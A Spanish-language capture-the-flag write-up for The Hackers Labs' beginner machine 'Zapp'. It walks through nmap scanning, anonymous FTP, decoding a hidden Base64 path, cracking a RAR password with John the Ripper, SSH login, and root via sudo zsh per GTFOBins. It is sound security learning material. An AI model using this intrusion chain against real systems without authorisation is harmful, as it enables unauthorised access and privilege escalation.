# 🎯 Zapp — The Hackers Labs

| Campo | Detalle |
|---|---|
| **Plataforma** | The Hackers Labs |
| **Dificultad** | Principiante |
| **SO** | Linux (Debian) |
| **Fecha** | 09/04/2026 |
| **Técnicas** | FTP anónimo · Base64 multicapa · John the Ripper · sudo GTFOBins |

---

## 🔍 1. Reconocimiento

### Escaneo de puertos (Nmap)

```bash
sudo nmap -p- --open -sS -sCV -Pn -n --min-rate 5000 -oN zapp_allports.nmap 192.168.0.19
```

**Resultados:**

| Puerto | Estado | Servicio | Versión |
|---|---|---|---|
| 21/tcp | open | FTP | vsftpd 3.0.3 |
| 22/tcp | open | SSH | OpenSSH 8.4p1 Debian |
| 80/tcp | open | HTTP | Apache 2.4.65 |

**Hallazgo crítico:** El script NSE de Nmap detecta que el FTP permite login anónimo y lista dos archivos: `login.txt` y `secret.txt`.

---

## 🗂️ 2. Enumeración

### Servicio FTP — Login anónimo

```bash
ftp 192.168.0.19
# Usuario: anonymous | Contraseña: (vacía)
get login.txt
get secret.txt
```

**Contenido de login.txt:**
```
puerto
4444
coffee
GoodLuck
```

**Contenido de secret.txt (Leet Speak):**
```
0jO cOn 31 c4fe 813n p23p424dO, 4 v3c35 14 pista 357a 3n 14 7424
```
> Traducción: *"Ojo con el café bien preparado, a veces la pista está en la taza"*

`coffee` y `GoodLuck` son **rabbit holes** — pistas falsas para despistar. La pista real está en la web.

### Servicio Web — Puerto 80

Accedemos a `http://192.168.0.19` y encontramos una página con título **zappskred**. El código fuente revela un div oculto:

```html
<div style="display:none">4444 VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=</div>
```

El `4444` conecta con `login.txt`. La cadena larga es **Base64 multicapa**.

### Decodificación Base64 multicapa

```bash
cadena="VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo="
while echo "$cadena" | base64 -d &>/dev/null 2>&1; do
    cadena=$(echo "$cadena" | base64 -d)
done
echo "$cadena"
```

**Resultado tras 4 decodificaciones:** `cuatrocuatroveces`

Esto nos da una ruta oculta en el servidor web.

### Directorio oculto

```
http://192.168.0.19/cuatrocuatroveces/
```

Encontramos un archivo: `Sup3rP4ss.rar`

```bash
wget http://192.168.0.19/cuatrocuatroveces/Sup3rP4ss.rar
```

---

## 🚀 3. Explotación

### Fuerza bruta sobre el RAR

El RAR está protegido con contraseña. Extraemos el hash y lo atacamos con John the Ripper:

```bash
rar2john Sup3rP4ss.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash
```

**Contraseña encontrada:** `reema`

### Extracción del RAR

```bash
unrar x Sup3rP4ss.rar
# Contraseña: reema
cat Sup3rP4ss.txt
```

**Contenido:**
```
Intenta probar con más >> 3spuM4
```

### Acceso SSH

Combinando el título de la web (`zappskred`) con la contraseña obtenida (`3spuM4`):

```bash
ssh zappskred@192.168.0.19
```

**Acceso conseguido.**

---

## 👑 4. Post-Explotación

### User Flag

```bash
cat /home/zappskred/user.txt
# ZWwgbWVqb3IgY2FmZQo= → "el mejor cafe"
```

### Escalada de Privilegios

```bash
sudo -l
```

**Resultado:**
```
(root) /bin/zsh
```

El usuario `zappskred` puede ejecutar `/bin/zsh` como root sin contraseña. Según GTFOBins, ejecutar un shell con sudo otorga directamente una shell de root:

```bash
sudo /bin/zsh
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
# c2llbXByZSBlcyBudWVzdHJvCg== → "siempre es nuestro"
```

---

## 📊 5. Resumen del ataque

| Fase | Técnica | Herramienta | Resultado |
|---|---|---|---|
| Reconocimiento | Escaneo de puertos | Nmap | FTP anónimo, SSH, HTTP |
| Enumeración FTP | Login anónimo | ftp | login.txt y secret.txt |
| Enumeración Web | Inspección de código fuente | Navegador | Base64 multicapa en div oculto |
| Decodificación | Base64 multicapa | bash | Ruta `/cuatrocuatroveces/` |
| Obtención de archivo | Descarga directa | wget | Sup3rP4ss.rar |
| Cracking | Fuerza bruta con diccionario | John the Ripper + rockyou.txt | Contraseña: reema |
| Acceso inicial | Credenciales SSH | ssh | zappskred:3spuM4 |
| Escalada | sudo + GTFOBins (zsh) | sudo | Shell de root |

---

## 📝 6. Lecciones aprendidas

1. **FTP anónimo** — Un error de configuración clásico que sigue apareciendo en entornos reales. Siempre verificar si el servicio FTP permite acceso sin credenciales.
2. **Código fuente web** — Los desarrolladores dejan información sensible en divs ocultos, comentarios HTML y metadatos. Siempre inspeccionar el código fuente antes de hacer fuzzing agresivo.
3. **Base64 no es cifrado** — Es solo codificación. Nunca protege información real. Puede estar aplicado en múltiples capas para dificultar la detección visual.
4. **Rabbit holes** — `coffee` y `GoodLuck` eran pistas falsas. En CTFs y en entornos reales es importante no perseguir cada pista sin validarla primero.
5. **sudo -l siempre** — Es el primer comando en post-explotación. Información gratuita que el sistema nos da legítimamente y que puede dar acceso directo a root.
6. **GTFOBins** — Cualquier binario con permisos sudo debe consultarse en gtfobins.github.io antes de buscar exploits más complejos.

---

*Writeup elaborado como parte del proceso de aprendizaje hacia la certificación eJPT*  
*GitHub: [HaRoldCant](https://github.com/HaRoldCant)*
